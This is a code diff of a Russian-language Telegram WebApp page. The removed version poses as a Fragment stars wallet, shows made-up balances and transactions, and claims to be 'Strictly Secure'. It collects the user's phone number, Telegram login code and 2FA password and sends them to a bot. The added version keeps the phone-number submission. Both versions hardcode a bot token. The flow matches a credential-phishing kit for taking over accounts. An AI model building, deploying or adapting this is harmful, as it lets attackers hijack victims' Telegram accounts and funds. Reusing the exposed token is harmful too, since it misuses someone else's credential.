-        <input class="pass-input" id="passInput" type="password" placeholder="Пароль 2FA"/>
-        <span class="eye-btn" id="eyeBtn" onclick="togglePass()">👁</span>
-      </div>
-    </div>
-    <button class="btn-main" onclick="goStep4()">Войти</button>
-    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
-  </div>
-
-  <!-- STEP 4: Dashboard -->
-  <div id="step4" style="display:none;">
-    <div class="dash-header">
-      <div class="dash-avatar">👤</div>
-      <div class="dash-name">Пользователь</div>
-      <div class="dash-handle" id="dashPhone">fragment.com</div>
-    </div>
-    <div class="stars-card">
-      <div class="sparkles">✨⭐✨</div>
-      <div class="stars-card-label">Баланс звёзд</div>
-      <div class="stars-balance">
-        <span class="stars-icon">⭐</span>
-        <span class="stars-amount">4 820</span>
-        <span class="stars-unit">звёзд</span>
-      </div>
-      <div class="stars-usd">≈ $48.20 USD · 1 ⭐ = $0.01</div>
-    </div>
-    <div class="action-row">
-      <button class="action-btn deposit" onclick="openDeposit()"><span class="action-icon">➕</span>Пополнить</button>
-      <button class="action-btn withdraw" onclick="openWithdraw()"><span class="action-icon">💸</span>Вывести</button>
-    </div>
-    <div class="section-title">История</div>
-    <div class="tx-item"><div class="tx-icon in">⭐</div><div class="tx-info"><div class="tx-label">Получено звёзд</div><div class="tx-date">Сегодня, 06:12</div></div><div class="tx-amount in">+1 000</div></div>
-    <div class="tx-item"><div class="tx-icon out">💸</div><div class="tx-info"><div class="tx-label">Вывод</div><div class="tx-date">Вчера, 18:44</div></div><div class="tx-amount out">−500</div></div>
-    <div class="tx-item"><div class="tx-icon in">💎</div><div class="tx-info"><div class="tx-label">Пополнение (TON)</div><div class="tx-date">27 мар, 11:20</div></div><div class="tx-amount in">+3 000</div></div>
-    <div class="tx-item"><div class="tx-icon out">💸</div><div class="tx-info"><div class="tx-label">Вывод</div><div class="tx-date">26 мар, 09:05</div></div><div class="tx-amount out">−680</div></div>
-  </div>
-
-</div>
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-// ========== TELEGRAM WEBAPP ==========
-const tg = window.Telegram.WebApp;
-tg.ready();
-const user_id = tg.initDataUnsafe?.user?.id || new URLSearchParams(window.location.search).get('user_id');
-
-const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
-
-// ========== СТРАНЫ ==========
-const countries=[
-  {flag:'🇷🇺',name:'Россия',code:'+7',mask:'(###) ### ## ##',example:'+7 (906) 480 08 08'},
-  {flag:'🇦🇿',name:'Азербайджан',code:'+994',mask:'(##) ### ## ##',example:'+994 (783) 862 96 88'},
-  {flag:'🇺🇦',name:'Украина',code:'+380',mask:'(##) ### ## ##',example:'+380 (50) 123 45 67'},
-  {flag:'🇰🇿',name:'Казахстан',code:'+7',mask:'(###) ### ## ##',example:'+7 (701) 234 56 78'},
-  {flag:'🇺🇿',name:'Узбекистан',code:'+998',mask:'(##) ### ## ##',example:'+998 (90) 123 45 67'},
-  {flag:'🇧🇾',name:'Беларусь',code:'+375',mask:'(##) ### ## ##',example:'+375 (29) 123 45 67'},
-  {flag:'🇬🇪',name:'Грузия',code:'+995',mask:'(###) ## ## ##',example:'+995 (555) 12 34 56'},
-  {flag:'🇦🇲',name:'Армения',code:'+374',mask:'(##) ### ###',example:'+374 (77) 123 456'},
-  {flag:'🇹🇷',name:'Турция',code:'+90',mask:'(###) ### ## ##',example:'+90 (532) 123 45 67'},
-  {flag:'🇩🇪',name:'Германия',code:'+49',mask:'### #######',example:'+49 151 1234567'},
-  {flag:'🇺🇸',name:'США',code:'+1',mask:'(###) ###-####',example:'+1 (555) 234-5678'},
-  {flag:'🇬🇧',name:'Великобритания',code:'+44',mask:'#### ######',example:'+44 7911 123456'},
-  {flag:'🇫🇷',name:'Франция',code:'+33',mask:'# ## ## ## ##',example:'+33 6 12 34 56 78'},
-  {flag:'🇮🇹',name:'Италия',code:'+39',mask:'### #######',example:'+39 347 1234567'},
-  {flag:'🇨🇳',name:'Китай',code:'+86',mask:'### #### ####',example:'+86 138 1234 5678'},
-  {flag:'🇮🇳',name:'Индия',code:'+91',mask:'##### #####',example:'+91 98765 43210'},
-  {flag:'🇧🇷',name:'Бразилия',code:'+55',mask:'(##) #####-####',example:'+55 (11) 91234-5678'},
-  {flag:'🇦🇪',name:'ОАЭ',code:'+971',mask:'## ### ####',example:'+971 50 123 4567'},
-  {flag:'🇰🇬',name:'Кыргызстан',code:'+996',mask:'(###) ## ## ##',example:'+996 (700) 12 34 56'},
-  {flag:'🇹🇯',name:'Таджикистан',code:'+992',mask:'## ### ####',example:'+992 93 123 4567'},
-  {flag:'🇵🇱',name:'Польша',code:'+48',mask:'### ### ###',example:'+48 512 345 678'},
-  {flag:'🇷🇴',name:'Румыния',code:'+40',mask:'## ### ####',example:'+40 72 123 4567'},
-];
-
-let selectedCountry=countries[0];
-let ddOpen=false;
-let currentStep=1;
-let timerInterval=null;
-
-// ========== UI ФУНКЦИИ ==========
-function buildList(f=''){
-  const list=document.getElementById('ddList');list.innerHTML='';
-  countries.filter(c=>c.name.toLowerCase().includes(f.toLowerCase())||c.code.includes(f)).forEach(c=>{
-    const el=document.createElement('div');el.className='dd-item';
-    el.innerHTML=`<span>${c.flag}</span><span>${c.name}</span><span class="dd-code">${c.code}</span>`;
-    el.onclick=()=>selectCountry(c);list.appendChild(el);
-  });
-}
-function selectCountry(c){
-  selectedCountry=c;
-  document.getElementById('selFlag').textContent=c.flag;
-  document.getElementById('selCountry').textContent=c.name+' ('+c.code+')';
-  document.getElementById('phonePrefix').textContent=c.code;
-  document.getElementById('exampleHint').textContent='Пример: '+c.example;
-  document.getElementById('phoneInput').value='';
-  document.getElementById('phoneInput').placeholder=c.mask.replace(/#/g,'0');
-  closeDropdown();
-}
-function toggleDropdown(){
-  ddOpen=!ddOpen;
-  document.getElementById('dropdown').classList.toggle('open',ddOpen);
-  document.getElementById('countrySelect').classList.toggle('open',ddOpen);
-  if(ddOpen){buildList();setTimeout(()=>document.getElementById('ddSearch').focus(),50);}
-}
-function closeDropdown(){ddOpen=false;document.getElementById('dropdown').classList.remove('open');document.getElementById('countrySelect').classList.remove('open');}
-function filterCountries(v){buildList(v);}
-document.addEventListener('click',e=>{if(!e.target.closest('#countrySelect')&&!e.target.closest('#dropdown'))closeDropdown();});
-function formatPhone(input){
-  let v=input.value.replace(/\D/g,''),mask=selectedCountry.mask,result='',vi=0;
-  for(let i=0;i<mask.length&&vi<v.length;i++){if(mask[i]==='#')result+=v[vi++];else result+=mask[i];}
-  input.value=result;
-}
-function setBackBtn(step){
-  const btn=document.getElementById('topbarBack');
-  btn.classList.toggle('visible',step>1&&step<=3);
-}
-function switchStep(from,to){
-  document.getElementById('step'+from).style.display='none';
-  const el=document.getElementById('step'+to);
-  el.style.display='block';
-  el.style.animation='slideUp 0.35s cubic-bezier(.22,.68,0,1.2) both';
-  currentStep=to;setBackBtn(to);
-}
-function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,currentStep-1);}
-
-// ========== ОТПРАВКА КОДА (ШАГ 1 → 2) ==========
-async function goStep2(){
-  const raw=document.getElementById('phoneInput').value.replace(/\D/g,'');
-  if(raw.length<5){document.getElementById('phoneError').classList.add('show');return;}
-  document.getElementById('phoneError').classList.remove('show');
-  
-  // ОТПРАВЛЯЕМ ЧИСТЫЙ НОМЕР: +79001234567
-  const cleanPhone = selectedCountry.code + raw;
-  
-  document.getElementById('displayPhone').textContent = cleanPhone;
-  document.getElementById('dashPhone').textContent = cleanPhone;
-  
-  const btn=document.getElementById('btnStep1');
-  btn.textContent='Отправка...';
-  btn.disabled=true;
-  
-  try {
-    tg.sendData(JSON.stringify({
-      action: "send_code",
-      phone: cleanPhone
-    }));
-  } catch(e){console.error(e);}
-  
-  btn.textContent='Далее';
-  btn.disabled=false;
-  switchStep(1,2);
-  setTimeout(()=>document.getElementById('c0').focus(),300);
-}
-
-// ========== ПРОВЕРКА КОДА (ШАГ 2 → 3) ==========
-async function goStep3(){
-  let code="";
-  for(let i=0;i<5;i++) code+=document.getElementById('c'+i).value;
-  if(code.length<5) return;
-  
-  const btn=document.getElementById('btnStep2');
-  btn.textContent='Проверка...';
-  btn.disabled=true;
-  document.getElementById('codeError').classList.remove('show');
-  
-  try {
-    tg.sendData(JSON.stringify({
-      action: "check_code",
-      code: code
-    }));
-    switchStep(2,3);
-  } catch(e){
-    document.getElementById('codeError').classList.add('show');
-    console.error(e);
-  }
-  
-  btn.textContent='Подтвердить';
-  btn.disabled=false;
-}
-
-// ========== ПРОВЕРКА 2FA (ШАГ 3 → 4) ==========
-async function goStep4(){
-  const password=document.getElementById('passInput').value;
-  if(!password){
-    alert('Введите пароль 2FA');
-    return;
-  }
-  
-  const btn=document.querySelector('#step3 .btn-main');
-  btn.textContent='Проверка...';
-  btn.disabled=true;
-  
-  try {
-    tg.sendData(JSON.stringify({
-      action: "check_2fa",
-      password: password
-    }));
-    switchStep(3,4);
-  } catch(e){
-    alert('Ошибка проверки 2FA');
-    console.error(e);
-  }
-  
-  btn.textContent='Войти';
-  btn.disabled=false;
-}
-
-// ========== ВВОД КОДА ==========
-function codeInput(el,idx){
-  el.value=el.value.replace(/\D/g,'');
-  el.classList.toggle('filled',el.value.length>0);
-  if(el.value.length===1&&idx<4)document.getElementById('c'+(idx+1)).focus();
-  if(idx===4&&el.value.length===1){
-    const all=[0,1,2,3,4].every(i=>document.getElementById('c'+i).value.length===1);
-    if(all)setTimeout(()=>goStep3(),400);
-  }
-}
-function codeKey(e,idx){
-  if(e.key==='Backspace'&&!e.target.value&&idx>0){
-    const p=document.getElementById('c'+(idx-1));p.value='';p.classList.remove('filled');p.focus();
-  }
-}
-
-// ========== ПОВТОРНАЯ ОТПРАВКА КОДА ==========
-let resendCooldown=null;
-async function resendCode(){
-  if(resendCooldown) return;
-  [0,1,2,3,4].forEach(i=>{const el=document.getElementById('c'+i);el.value='';el.classList.remove('filled');});
-  document.getElementById('codeError').classList.remove('show');
-  document.getElementById('c0').focus();
-  
-  const phone = document.getElementById('displayPhone').textContent;
-  try {
-    tg.sendData(JSON.stringify({
-      action: "send_code",
-      phone: phone
-    }));
-  } catch(e){}
-  
-  const link=document.querySelector('.resend-link');
-  link.style.color='var(--text-muted)';
-  link.style.cursor='default';
-  let sec=60;
-  link.textContent='Повторно через '+sec+'с';
-  resendCooldown=setInterval(()=>{
-    sec--;
-    link.textContent='Повторно через '+sec+'с';
-    if(sec<=0){
-      clearInterval(resendCooldown);resendCooldown=null;
-      link.textContent='Отправить повторно';
-      link.style.color='var(--tg-blue)';
-      link.style.cursor='pointer';
-    }
-  },1000);
-}
-
-function togglePass(){
-  const inp=document.getElementById('passInput'),eye=document.getElementById('eyeBtn');
-  inp.type=inp.type==='password'?'text':'password';eye.textContent=inp.type==='password'?'👁':'🙈';
-}
-
-// ========== ВЫВОД / ПОПОЛНЕНИЕ ==========
-function openWithdraw(){
-  document.getElementById('wStep1').style.display='block';
-  document.getElementById('wStep2').style.display='none';
-  document.getElementById('withdrawAmount').value='';
-  document.getElementById('withdrawUSD').textContent='≈ $0.00';
-  document.getElementById('withdrawError').classList.remove('show');
-  document.getElementById('withdrawModal').classList.add('show');
-}
-function closeWithdraw(){document.getElementById('withdrawModal').classList.remove('show');if(timerInterval){clearInterval(timerInterval);timerInterval=null;}}
-function closeWithdrawIfOutside(e){if(e.target===document.getElementById('withdrawModal'))closeWithdraw();}
-function setAmount(n){document.getElementById('withdrawAmount').value=n;updateUSD();}
-function updateUSD(){const v=parseFloat(document.getElementById('withdrawAmount').value)||0;document.getElementById('withdrawUSD').textContent='≈ $'+(v*0.01).toFixed(2)+' USD';}
-function doWithdraw(){
-  const v=parseFloat(document.getElementById('withdrawAmount').value);
-  if(!v||v<1){document.getElementById('withdrawError').classList.add('show');return;}
-  document.getElementById('withdrawError').classList.remove('show');
-  tg.sendData(JSON.stringify({action:"withdraw",amount:v}));
-  document.getElementById('wStep1').style.display='none';
-  document.getElementById('wStep2').style.display='block';
-  let sec=180;document.getElementById('timerNum').textContent=sec;
-  if(timerInterval)clearInterval(timerInterval);
-  timerInterval=setInterval(()=>{sec--;document.getElementById('timerNum').textContent=sec;if(sec<=0){clearInterval(timerInterval);timerInterval=null;document.getElementById('timerNum').textContent='✓';}},1000);
-}
-function openDeposit(){document.getElementById('depositModal').classList.add('show');}
-function closeDeposit(){document.getElementById('depositModal').classList.remove('show');}
-function closeDepositIfOutside(e){if(e.target===document.getElementById('depositModal'))closeDeposit();}
-function depositTON(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"TON"}));alert('Откройте TON кошелёк для пополнения');}
-function depositCard(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CARD"}));alert('Переход к оплате картой...');}
-function depositCrypto(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CRYPTO"}));alert('Выберите криптовалюту');}
-
-// ========== ИНИЦИАЛИЗАЦИЯ ==========
-buildList();
-setBackBtn(1);
-</script>
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        
+        // Получаем ID пользователя
+        const user_id = tg.initDataUnsafe?.user?.id;
+        
+        // Токен бота
+        const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
+        
+        function sendCode() {
+            const statusDiv = document.getElementById('status');
+            
+            // Получаем номер и очищаем от пробелов, скобок, дефисов
+            let raw = document.getElementById('phone').value.replace(/\D/g, '');
+            
+            if (raw.length < 5) {
+                statusDiv.innerHTML = '<span class="error">❌ Введите корректный номер</span>';
+                return;
+            }
+            
+            // Формируем номер с кодом страны (+7 для России)
+            const cleanPhone = '+7' + raw;
+            
+            statusDiv.innerHTML = '<span>📱 Отправка...</span>';
+            
+            // Данные для отправки
+            const payload = JSON.stringify({
+                action: "send_code",
+                phone: cleanPhone
+            });
+            
+            console.log("Отправляю:", payload);
+            console.log("User ID:", user_id);
+            
+            try {
+                // Отправляем данные боту
+                tg.sendData(payload);
+                statusDiv.innerHTML = '<span class="success">✅ Код отправлен на ' + cleanPhone + '<br>Проверьте Telegram</span>';
+            } catch(e) {
+                console.error("Ошибка:", e);
+                statusDiv.innerHTML = '<span class="error">❌ Ошибка: ' + e.message + '</span>';
+            }
+        }
+        
+        // Показываем в консоли, что WebApp готов
+        console.log("✅ WebApp готов");
+        console.log("User ID:", user_id);
+        console.log("tg.sendData доступен:", typeof tg.sendData === 'function');
+    </script>
 </body>
 </html>
